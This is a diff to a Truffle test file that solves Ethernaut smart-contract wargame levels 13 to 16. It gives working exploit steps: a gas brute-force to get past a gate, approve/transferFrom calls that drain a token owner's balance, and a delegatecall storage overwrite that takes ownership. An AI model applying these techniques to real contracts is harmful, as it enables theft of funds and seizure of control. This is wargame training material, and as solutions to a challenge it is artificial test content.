@@ -22,7 +22,6 @@ const GatekeeperExploit    = artifacts.require("GatekeeperExploit");
 const GatekeeperTwo        = artifacts.require("GatekeeperTwo");
 const GatekeeperTwoExploit = artifacts.require("GatekeeperTwoExploit");
 const NaughtCoin           = artifacts.require("NaughtCoin");
-const NaughtCoinExploit    = artifacts.require("NaughtCoinExploit");
 const LibraryContract      = artifacts.require("LibraryContract");
 const Preservation         = artifacts.require("Preservation");
 const PreservationExploit  = artifacts.require("PreservationExploit");
@@ -278,7 +277,7 @@ contract("Ethernaut", (accounts) => {
 			const contract = await Gatekeeper.new();
 			const exploit = await GatekeeperExploit.new(); // use a proxy contract to bypass gateOne() and gateThree() modifiers
 			for (let i = 15625; i < 15630; i++) {
-				// brute-force the gas to bypass gateTwo() modifier | trial and error
+				// brute-force the gas to bypass gateTwo() modifier | trial and error | the scope was adjusted to speed up the test
 				try {
 					await exploit.run(contract.address, { from: hacker, gas: 800000 + i });
 					// console.log(i); // required gas is 800000 + 15628 = 8015628
@@ -299,36 +298,24 @@ contract("Ethernaut", (accounts) => {
 		});
 		it("Exploit", async () => {
 			const contract = await GatekeeperTwo.new();
-			const exploit = await GatekeeperTwoExploit.new(contract.address, { from: hacker }); // use a proxy contract and constructor method to bypass gateOne(), gateTwo(), and gateThree() modifiers
+			const exploit = await GatekeeperTwoExploit.new(contract.address, { from: hacker }); // use a proxy contract and constructor function to bypass gateOne(), gateTwo(), and gateThree() modifiers
 			const entrantCurrent = await contract.entrant();
 			assert.equal(hacker, entrantCurrent, "Failed to pass level 14."); // become the entrant to pass the level
 		});
 	});
 
 	describe("Level 15 - NaughtCoin", async () => {
-		it("Deploy NaughtCoin and NaughtCoinExploit Contracts", async () => {
+		it("Deploy NaughtCoin Contracts", async () => {
 			let deployed = await NaughtCoin.deployed();
 			assert(deployed, "NaughtCoin contract is not deployed.");
-			deployed = await NaughtCoinExploit.deployed();
-			assert(deployed, "NaughtCoinExploit contract is not deployed.");
 		});
 		it("Exploit", async () => {
 			const contract = await NaughtCoin.new(owner);
 			const balanceCurrent = await contract.balanceOf(owner);
-			await contract.approve(hacker, balanceCurrent); // calling publicly available and unprotected ERC20 methods "approve" and "transferFrom"
+			await contract.approve(hacker, balanceCurrent); // call publicly available and unprotected ERC20 functions "approve" and "transferFrom" to exploit the contract
 			await contract.transferFrom(owner, hacker, balanceCurrent, {from: hacker});
 			const balanceNew = await contract.balanceOf(owner);
-			assert.equal(balanceNew, 0, "Failed to pass level 15."); // make the target's balance zero to pass the level
-			// another example using an exploit contract
-			/*
-			const contract = await NaughtCoin.new(owner);
-			const exploit = await NaughtCoinExploit.new();
-			const balanceCurrent = await contract.balanceOf(owner);
-			await contract.approve(exploit.address, balanceCurrent);
-			await exploit.run(contract.address, owner, balanceCurrent);
-			const balanceNew = await contract.balanceOf(owner);
-			assert.equal(balanceNew, 0, "Failed to pass level 15.");
-			*/
+			assert.equal(balanceNew, 0, "Failed to pass level 15."); // withdraw the whole balance to pass the level
 		});
 	});
 
@@ -345,7 +332,7 @@ contract("Ethernaut", (accounts) => {
 			const library = await LibraryContract.new();
 			const contract = await Preservation.new(library.address, library.address);
 			const exploit = await PreservationExploit.new();
-			await contract.setFirstTime(exploit.address); // "delegatecall" to LibraryContract will overwrite "timeZone1Library" address due to incorrectly defined storage in LibraryContract
+			await contract.setFirstTime(exploit.address); // "delegatecall" to "LibraryContract" will overwrite "timeZone1Library" address due to incorrectly defined contract storage in "LibraryContract"
 			await contract.setFirstTime((new Date()).getTime(), {from: hacker});
 			const ownerCurrent = await contract.owner();
 			assert.equal(hacker, ownerCurrent, "Failed to pass level 16."); // become the owner to pass the level
